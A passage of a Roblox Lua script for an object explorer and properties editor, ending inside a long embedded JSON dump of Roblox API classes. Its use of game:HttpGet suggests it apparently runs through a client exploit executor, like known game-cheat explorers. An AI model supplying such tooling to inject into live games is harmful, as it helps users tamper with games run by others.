	if key.KeyCode == Enum.KeyCode.LeftShift then
		HoldingShift = false
	end
end)

while RbxApi == nil do
	RbxApi = GetApiRemote:Invoke()
	wait()
end

explorerFilter.Changed:connect(function(prop)
	if prop == "Text" then
		rawUpdateList()
	end
end)

CurrentInsertObjectWindow = CreateInsertObjectMenu(
	GetClasses(),
	"",
	false,
	function(option)
		CurrentInsertObjectWindow.Visible = false
		local list = SelectionVar():Get()
		for i = 1,#list do
			pcall(function() Instance.new(option,list[i]) end)
		end
		DestroyRightClick()
	end
)
end)
spawn(function()
	--[[
	
Change log:

09/18
	Fixed checkbox mouseover sprite
	Encapsulated checkbox creation into separate method
	Fixed another checkbox issue

09/15
	Invalid input is ignored instead of setting to default of that data type
	Consolidated control methods and simplified them
	All input goes through ToValue method
	Fixed position of BrickColor palette
	Made DropDown appear above row if it would otherwise exceed the page height
	Cleaned up stylesheets

09/14
	Made properties window scroll when mouse wheel scrolled
	Object/Instance and Color3 data types handled properly
	Multiple BrickColor controls interfering with each other fixed
	Added support for Content data type
	
--]]

wait(0.2)

local print = function(s)
	print(tostring(s))
end

-- Services
local Teams = game:GetService("Teams")
local Workspace = game:GetService("Workspace")
local Debris = game:GetService("Debris")
local ContentProvider = game:GetService("ContentProvider")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Functions
function httpGet(url)
	return game:HttpGet(url,true)
end

-- RbxApi Stuff

local apiUrl = "http://anaminus.github.io/rbx/json/api/latest.json"
local maxChunkSize = 100 * 1000
local ApiJson
if script:FindFirstChild("RawApiJson") then
	ApiJson = script.RawApiJson
else
	ApiJson = ""
end


function getLocalApiJson()
	local rawApiJson = [===[
	[{"Superclass":null,"type":"Class","Name":"Instance","tags":["notbrowsable"]},{"ValueType":"bool","type":"Property","Name":"Archivable","tags":[],"Class":"Instance"},{"ValueType":"string","type":"Property","Name":"ClassName","tags":["readonly"],"Class":"Instance"},{"ValueType":"int","type":"Property","Name":"DataCost","tags":["RobloxPlaceSecurity","readonly"],"Class":"Instance"},{"ValueType":"string","type":"Property","Name":"Name","tags":[],"Class":"Instance"},{"ValueType":"Object","type":"Property","Name":"Parent","tags":[],"Class":"Instance"},{"ValueType":"bool","type":"Property","Name":"RobloxLocked","tags":["PluginSecurity"],"Class":"Instance"},{"ValueType":"bool","type":"Property","Name":"archivable","tags":["hidden"],"Class":"Instance"},{"ValueType":"string","type":"Property","Name":"className","tags":["deprecated","readonly"],"Class":"Instance"},{"ReturnType":"void","Arguments":[],"Name":"ClearAllChildren","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"Clone","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Destroy","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"bool","Name":"recursive","Default":"false"}],"Name":"FindFirstChild","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetChildren","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"scopeLength","Default":"4"}],"Name":"GetDebugId","tags":["PluginSecurity","notbrowsable"],"Class":"Instance","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetFullName","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"IsA","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Instance","Name":"descendant","Default":null}],"Name":"IsAncestorOf","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Instance","Name":"ancestor","Default":null}],"Name":"IsDescendantOf","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Remove","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"children","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"clone","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"destroy","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"bool","Name":"recursive","Default":"false"}],"Name":"findFirstChild","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"getChildren","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"isA","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Instance","Name":"ancestor","Default":null}],"Name":"isDescendantOf","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"remove","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"childName","Default":null}],"Name":"WaitForChild","tags":[],"Class":"Instance","type":"YieldFunction"},{"Arguments":[{"Name":"child","Type":"Instance"},{"Name":"parent","Type":"Instance"}],"Name":"AncestryChanged","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"property","Type":"Property"}],"Name":"Changed","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"child","Type":"Instance"}],"Name":"ChildAdded","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"child","Type":"Instance"}],"Name":"ChildRemoved","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"descendant","Type":"Instance"}],"Name":"DescendantAdded","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"descendant","Type":"Instance"}],"Name":"DescendantRemoving","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"child","Type":"Instance"}],"Name":"childAdded","tags":["deprecated"],"Class":"Instance","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Accoutrement","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"AttachmentForward","tags":[],"Class":"Accoutrement"},{"ValueType":"CoordinateFrame","type":"Property","Name":"AttachmentPoint","tags":[],"Class":"Accoutrement"},{"ValueType":"Vector3","type":"Property","Name":"AttachmentPos","tags":[],"Class":"Accoutrement"},{"ValueType":"Vector3","type":"Property","Name":"AttachmentRight","tags":[],"Class":"Accoutrement"},{"ValueType":"Vector3","type":"Property","Name":"AttachmentUp","tags":[],"Class":"Accoutrement"},{"Superclass":"Accoutrement","type":"Class","Name":"Accessory","tags":[]},{"Superclass":"Accoutrement","type":"Class","Name":"Hat","tags":["deprecated"]},{"Superclass":"Instance","type":"Class","Name":"AdService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[],"Name":"ShowVideoAd","tags":[],"Class":"AdService","type":"Function"},{"Arguments":[{"Name":"adShown","Type":"bool"}],"Name":"VideoAdClosed","tags":[],"Class":"AdService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"AdvancedDragger","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Animation","tags":[]},{"ValueType":"Content","type":"Property","Name":"AnimationId","tags":[],"Class":"Animation"},{"Superclass":"Instance","type":"Class","Name":"AnimationController","tags":[]},{"ReturnType":"Array","Arguments":[],"Name":"GetPlayingAnimationTracks","tags":[],"Class":"AnimationController","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"animation","Default":null}],"Name":"LoadAnimation","tags":[],"Class":"AnimationController","type":"Function"},{"Arguments":[{"Name":"animationTrack","Type":"Instance"}],"Name":"AnimationPlayed","tags":[],"Class":"AnimationController","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"AnimationTrack","tags":[]},{"ValueType":"Object","type":"Property","Name":"Animation","tags":["readonly"],"Class":"AnimationTrack"},{"ValueType":"bool","type":"Property","Name":"IsPlaying","tags":["readonly"],"Class":"AnimationTrack"},{"ValueType":"float","type":"Property","Name":"Length","tags":["readonly"],"Class":"AnimationTrack"},{"ValueType":"AnimationPriority","type":"Property","Name":"Priority","tags":[],"Class":"AnimationTrack"},{"ValueType":"float","type":"Property","Name":"TimePosition","tags":[],"Class":"AnimationTrack"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"speed","Default":"1"}],"Name":"AdjustSpeed","tags":[],"Class":"AnimationTrack","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"weight","Default":"1"},{"Type":"float","Name":"fadeTime","Default":"0.100000001"}],"Name":"AdjustWeight","tags":[],"Class":"AnimationTrack","type":"Function"},{"ReturnType":"double","Arguments":[{"Type":"string","Name":"keyframeName","Default":null}],"Name":"GetTimeOfKeyframe","tags":[],"Class":"AnimationTrack","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"fadeTime","Default":"0.100000001"},{"Type":"float","Name":"weight","Default":"1"},{"Type":"float","Name":"speed","Default":"1"}],"Name":"Play","tags":[],"Class":"AnimationTrack","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"fadeTime","Default":"0.100000001"}],"Name":"Stop","tags":[],"Class":"AnimationTrack","type":"Function"},{"Arguments":[{"Name":"keyframeName","Type":"string"}],"Name":"KeyframeReached","tags":[],"Class":"AnimationTrack","type":"Event"},{"Arguments":[],"Name":"Stopped","tags":["deprecated"],"Class":"AnimationTrack","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"AnimationTrackState","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Animator","tags":[]},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"animation","Default":null}],"Name":"LoadAnimation","tags":[],"Class":"Animator","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"AssetService","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"revertUrl","Default":null}],"Name":"SetAssetRevertUrl","tags":["LocalUserSecurity"],"Class":"AssetService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"versionsUrl","Default":null}],"Name":"SetAssetVersionsUrl","tags":["LocalUserSecurity"],"Class":"AssetService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"accessUrl","Default":null}],"Name":"SetPlaceAccessUrl","tags":["LocalUserSecurity"],"Class":"AssetService","type":"Function"},{"ReturnType":"int","Arguments":[{"Type":"string","Name":"placeName","Default":null},{"Type":"int","Name":"templatePlaceID","Default":null},{"Type":"string","Name":"description","Default":""}],"Name":"CreatePlaceAsync","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"string","Name":"placeName","Default":null},{"Type":"int","Name":"templatePlaceID","Default":null},{"Type":"string","Name":"description","Default":""}],"Name":"CreatePlaceInPlayerInventoryAsync","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"Dictionary","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"int","Name":"pageNum","Default":"1"}],"Name":"GetAssetVersions","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"int","Name":"creationID","Default":null}],"Name":"GetCreatorAssetID","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[],"Name":"GetGamePlacesAsync","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"Dictionary","Arguments":[{"Type":"int","Name":"placeId","Default":null}],"Name":"GetPlacePermissions","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"int","Name":"versionNumber","Default":null}],"Name":"RevertAsset","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"void","Arguments":[],"Name":"SavePlaceAsync","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"AccessType","Name":"accessType","Default":"Everyone"},{"Type":"Array","Name":"inviteList","Default":"{}"}],"Name":"SetPlacePermissions","tags":[],"Class":"AssetService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"Attachment","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Axis","tags":[],"Class":"Attachment"},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"Position","tags":[],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"Rotation","tags":[],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"SecondaryAxis","tags":[],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"WorldAxis","tags":["readonly"],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"WorldPosition","tags":["readonly"],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"WorldRotation","tags":["readonly"],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"WorldSecondaryAxis","tags":["readonly"],"Class":"Attachment"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetAxis","tags":[],"Class":"Attachment","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetSecondaryAxis","tags":[],"Class":"Attachment","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"axis","Default":null}],"Name":"SetAxis","tags":[],"Class":"Attachment","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"axis","Default":null}],"Name":"SetSecondaryAxis","tags":[],"Class":"Attachment","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"BadgeService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetAwardBadgeUrl","tags":["LocalUserSecurity"],"Class":"BadgeService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"seconds","Default":null}],"Name":"SetHasBadgeCooldown","tags":["LocalUserSecurity"],"Class":"BadgeService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetHasBadgeUrl","tags":["LocalUserSecurity"],"Class":"BadgeService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetIsBadgeDisabledUrl","tags":["LocalUserSecurity"],"Class":"BadgeService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetIsBadgeLegalUrl","tags":["LocalUserSecurity"],"Class":"BadgeService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null}],"Name":"SetPlaceId","tags":["LocalUserSecurity"],"Class":"BadgeService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"badgeId","Default":null}],"Name":"AwardBadge","tags":[],"Class":"BadgeService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"badgeId","Default":null}],"Name":"IsDisabled","tags":[],"Class":"BadgeService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"badgeId","Default":null}],"Name":"IsLegal","tags":[],"Class":"BadgeService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"badgeId","Default":null}],"Name":"UserHasBadge","tags":[],"Class":"BadgeService","type":"YieldFunction"},{"Arguments":[{"Name":"message","Type":"string"},{"Name":"userId","Type":"int"},{"Name":"badgeId","Type":"int"}],"Name":"BadgeAwarded","tags":["RobloxScriptSecurity"],"Class":"BadgeService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"BasePlayerGui","tags":[]},{"Superclass":"BasePlayerGui","type":"Class","Name":"CoreGui","tags":["notCreatable","notbrowsable"]},{"ValueType":"Object","type":"Property","Name":"SelectionImageObject","tags":["RobloxScriptSecurity"],"Class":"CoreGui"},{"ValueType":"int","type":"Property","Name":"Version","tags":["readonly"],"Class":"CoreGui"},{"Superclass":"BasePlayerGui","type":"Class","Name":"PlayerGui","tags":["notCreatable"]},{"ValueType":"Object","type":"Property","Name":"SelectionImageObject","tags":[],"Class":"PlayerGui"},{"ReturnType":"float","Arguments":[],"Name":"GetTopbarTransparency","tags":[],"Class":"PlayerGui","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"transparency","Default":null}],"Name":"SetTopbarTransparency","tags":[],"Class":"PlayerGui","type":"Function"},{"Arguments":[{"Name":"transparency","Type":"float"}],"Name":"TopbarTransparencyChangedSignal","tags":[],"Class":"PlayerGui","type":"Event"},{"Superclass":"BasePlayerGui","type":"Class","Name":"StarterGui","tags":[]},{"ValueType":"bool","type":"Property","Name":"ResetPlayerGuiOnSpawn","tags":[],"Class":"StarterGui"},{"ValueType":"bool","type":"Property","Name":"ShowDevelopmentGui","tags":[],"Class":"StarterGui"},{"ReturnType":"bool","Arguments":[{"Type":"CoreGuiType","Name":"coreGuiType","Default":null}],"Name":"GetCoreGuiEnabled","tags":[],"Class":"StarterGui","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"parameterName","Default":null},{"Type":"Function","Name":"getFunction","Default":null}],"Name":"RegisterGetCore","tags":["RobloxScriptSecurity"],"Class":"StarterGui","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"parameterName","Default":null},{"Type":"Function","Name":"setFunction","Default":null}],"Name":"RegisterSetCore","tags":["RobloxScriptSecurity"],"Class":"StarterGui","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"parameterName","Default":null},{"Type":"Variant","Name":"value","Default":null}],"Name":"SetCore","tags":[],"Class":"StarterGui","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"CoreGuiType","Name":"coreGuiType","Default":null},{"Type":"bool","Name":"enabled","Default":null}],"Name":"SetCoreGuiEnabled","tags":[],"Class":"StarterGui","type":"Function"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"parameterName","Default":null}],"Name":"GetCore","tags":[],"Class":"StarterGui","type":"YieldFunction"},{"Arguments":[{"Name":"coreGuiType","Type":"CoreGuiType"},{"Name":"enabled","Type":"bool"}],"Name":"CoreGuiChangedSignal","tags":["RobloxScriptSecurity"],"Class":"StarterGui","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"BinaryStringValue","tags":[]},{"Superclass":"Instance","type":"Class","Name":"BindableEvent","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"Fire","tags":[],"Class":"BindableEvent","type":"Function"},{"Arguments":[{"Name":"arguments","Type":"Tuple"}],"Name":"Event","tags":[],"Class":"BindableEvent","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"BindableFunction","tags":[]},{"ReturnType":"Tuple","Arguments":[{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"Invoke","tags":[],"Class":"BindableFunction","type":"YieldFunction"},{"ReturnType":"Tuple","Arguments":[{"Name":"arguments","Type":"Tuple"}],"Name":"OnInvoke","tags":[],"Class":"BindableFunction","type":"Callback"},{"Superclass":"Instance","type":"Class","Name":"BodyMover","tags":[]},{"Superclass":"BodyMover","type":"Class","Name":"BodyAngularVelocity","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"AngularVelocity","tags":[],"Class":"BodyAngularVelocity"},{"ValueType":"Vector3","type":"Property","Name":"MaxTorque","tags":[],"Class":"BodyAngularVelocity"},{"ValueType":"float","type":"Property","Name":"P","tags":[],"Class":"BodyAngularVelocity"},{"ValueType":"Vector3","type":"Property","Name":"angularvelocity","tags":["deprecated"],"Class":"BodyAngularVelocity"},{"ValueType":"Vector3","type":"Property","Name":"maxTorque","tags":["deprecated"],"Class":"BodyAngularVelocity"},{"Superclass":"BodyMover","type":"Class","Name":"BodyForce","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Force","tags":[],"Class":"BodyForce"},{"ValueType":"Vector3","type":"Property","Name":"force","tags":["deprecated"],"Class":"BodyForce"},{"Superclass":"BodyMover","type":"Class","Name":"BodyGyro","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"BodyGyro"},{"ValueType":"float","type":"Property","Name":"D","tags":[],"Class":"BodyGyro"},{"ValueType":"Vector3","type":"Property","Name":"MaxTorque","tags":[],"Class":"BodyGyro"},{"ValueType":"float","type":"Property","Name":"P","tags":[],"Class":"BodyGyro"},{"ValueType":"CoordinateFrame","type":"Property","Name":"cframe","tags":["deprecated"],"Class":"BodyGyro"},{"ValueType":"Vector3","type":"Property","Name":"maxTorque","tags":["deprecated"],"Class":"BodyGyro"},{"Superclass":"BodyMover","type":"Class","Name":"BodyPosition","tags":[]},{"ValueType":"float","type":"Property","Name":"D","tags":[],"Class":"BodyPosition"},{"ValueType":"Vector3","type":"Property","Name":"MaxForce","tags":[],"Class":"BodyPosition"},{"ValueType":"float","type":"Property","Name":"P","tags":[],"Class":"BodyPosition"},{"ValueType":"Vector3","type":"Property","Name":"Position","tags":[],"Class":"BodyPosition"},{"ValueType":"Vector3","type":"Property","Name":"maxForce","tags":["deprecated"],"Class":"BodyPosition"},{"ValueType":"Vector3","type":"Property","Name":"position","tags":["deprecated"],"Class":"BodyPosition"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetLastForce","tags":[],"Class":"BodyPosition","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"lastForce","tags":["deprecated"],"Class":"BodyPosition","type":"Function"},{"Arguments":[],"Name":"ReachedTarget","tags":[],"Class":"BodyPosition","type":"Event"},{"Superclass":"BodyMover","type":"Class","Name":"BodyThrust","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Force","tags":[],"Class":"BodyThrust"},{"ValueType":"Vector3","type":"Property","Name":"Location","tags":[],"Class":"BodyThrust"},{"ValueType":"Vector3","type":"Property","Name":"force","tags":["deprecated"],"Class":"BodyThrust"},{"ValueType":"Vector3","type":"Property","Name":"location","tags":["deprecated"],"Class":"BodyThrust"},{"Superclass":"BodyMover","type":"Class","Name":"BodyVelocity","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"MaxForce","tags":[],"Class":"BodyVelocity"},{"ValueType":"float","type":"Property","Name":"P","tags":[],"Class":"BodyVelocity"},{"ValueType":"Vector3","type":"Property","Name":"Velocity","tags":[],"Class":"BodyVelocity"},{"ValueType":"Vector3","type":"Property","Name":"maxForce","tags":["deprecated"],"Class":"BodyVelocity"},{"ValueType":"Vector3","type":"Property","Name":"velocity","tags":["deprecated"],"Class":"BodyVelocity"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetLastForce","tags":[],"Class":"BodyVelocity","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"lastForce","tags":[],"Class":"BodyVelocity","type":"Function"},{"Superclass":"BodyMover","type":"Class","Name":"RocketPropulsion","tags":[]},{"ValueType":"float","type":"Property","Name":"CartoonFactor","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"MaxSpeed","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"MaxThrust","tags":[],"Class":"RocketPropulsion"},{"ValueType":"Vector3","type":"Property","Name":"MaxTorque","tags":[],"Class":"RocketPropulsion"},{"ValueType":"Object","type":"Property","Name":"Target","tags":[],"Class":"RocketPropulsion"},{"ValueType":"Vector3","type":"Property","Name":"TargetOffset","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"TargetRadius","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"ThrustD","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"ThrustP","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"TurnD","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"TurnP","tags":[],"Class":"RocketPropulsion"},{"ReturnType":"void","Arguments":[],"Name":"Abort","tags":[],"Class":"RocketPropulsion","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Fire","tags":[],"Class":"RocketPropulsion","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"fire","tags":["deprecated"],"Class":"RocketPropulsion","type":"Function"},{"Arguments":[],"Name":"ReachedTarget","tags":[],"Class":"RocketPropulsion","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"BoolValue","tags":[]},{"ValueType":"bool","type":"Property","Name":"Value","tags":[],"Class":"BoolValue"},{"Arguments":[{"Name":"value","Type":"bool"}],"Name":"Changed","tags":[],"Class":"BoolValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"bool"}],"Name":"changed","tags":["deprecated"],"Class":"BoolValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"BrickColorValue","tags":[]},{"ValueType":"BrickColor","type":"Property","Name":"Value","tags":[],"Class":"BrickColorValue"},{"Arguments":[{"Name":"value","Type":"BrickColor"}],"Name":"Changed","tags":[],"Class":"BrickColorValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"BrickColor"}],"Name":"changed","tags":["deprecated"],"Class":"BrickColorValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Button","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"active","Default":null}],"Name":"SetActive","tags":["PluginSecurity"],"Class":"Button","type":"Function"},{"Arguments":[],"Name":"Click","tags":["PluginSecurity"],"Class":"Button","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"CFrameValue","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"Value","tags":[],"Class":"CFrameValue"},{"Arguments":[{"Name":"value","Type":"CoordinateFrame"}],"Name":"Changed","tags":[],"Class":"CFrameValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"CoordinateFrame"}],"Name":"changed","tags":["deprecated"],"Class":"CFrameValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"CacheableContentProvider","tags":[]},{"Superclass":"CacheableContentProvider","type":"Class","Name":"MeshContentProvider","tags":[]},{"Superclass":"CacheableContentProvider","type":"Class","Name":"SolidModelContentProvider","tags":[]},{"Superclass":"CacheableContentProvider","type":"Class","Name":"TextureContentProvider","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Camera","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"Camera"},{"ValueType":"Object","type":"Property","Name":"CameraSubject","tags":[],"Class":"Camera"},{"ValueType":"CameraType","type":"Property","Name":"CameraType","tags":[],"Class":"Camera"},{"ValueType":"CoordinateFrame","type":"Property","Name":"CoordinateFrame","tags":["deprecated","hidden"],"Class":"Camera"},{"ValueType":"float","type":"Property","Name":"FieldOfView","tags":[],"Class":"Camera"},{"ValueType":"CoordinateFrame","type":"Property","Name":"Focus","tags":[],"Class":"Camera"},{"ValueType":"bool","type":"Property","Name":"HeadLocked","tags":[],"Class":"Camera"},{"ValueType":"float","type":"Property","Name":"HeadScale","tags":[],"Class":"Camera"},{"ValueType":"Vector2","type":"Property","Name":"ViewportSize","tags":["readonly"],"Class":"Camera"},{"ValueType":"CoordinateFrame","type":"Property","Name":"focus","tags":["deprecated"],"Class":"Camera"},{"ReturnType":"float","Arguments":[],"Name":"GetPanSpeed","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"CoordinateFrame","Arguments":[],"Name":"GetRenderCFrame","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"float","Arguments":[],"Name":"GetRoll","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"float","Arguments":[],"Name":"GetTiltSpeed","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"CoordinateFrame","Name":"endPos","Default":null},{"Type":"CoordinateFrame","Name":"endFocus","Default":null},{"Type":"float","Name":"duration","Default":null}],"Name":"Interpolate","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"units","Default":null}],"Name":"PanUnits","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"Ray","Arguments":[{"Type":"float","Name":"x","Default":null},{"Type":"float","Name":"y","Default":null},{"Type":"float","Name":"depth","Default":"0"}],"Name":"ScreenPointToRay","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"CameraPanMode","Name":"mode","Default":"Classic"}],"Name":"SetCameraPanMode","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"rollAngle","Default":null}],"Name":"SetRoll","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"units","Default":null}],"Name":"TiltUnits","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"Ray","Arguments":[{"Type":"float","Name":"x","Default":null},{"Type":"float","Name":"y","Default":null},{"Type":"float","Name":"depth","Default":"0"}],"Name":"ViewportPointToRay","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Vector3","Name":"worldPoint","Default":null}],"Name":"WorldToScreenPoint","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Vector3","Name":"worldPoint","Default":null}],"Name":"WorldToViewportPoint","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"float","Name":"distance","Default":null}],"Name":"Zoom","tags":["RobloxScriptSecurity"],"Class":"Camera","type":"Function"},{"Arguments":[{"Name":"entering","Type":"bool"}],"Name":"FirstPersonTransition","tags":["RobloxPlaceSecurity"],"Class":"Camera","type":"Event"},{"Arguments":[],"Name":"InterpolationFinished","tags":[],"Class":"Camera","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ChangeHistoryService","tags":["notCreatable"]},{"ReturnType":"Tuple","Arguments":[],"Name":"GetCa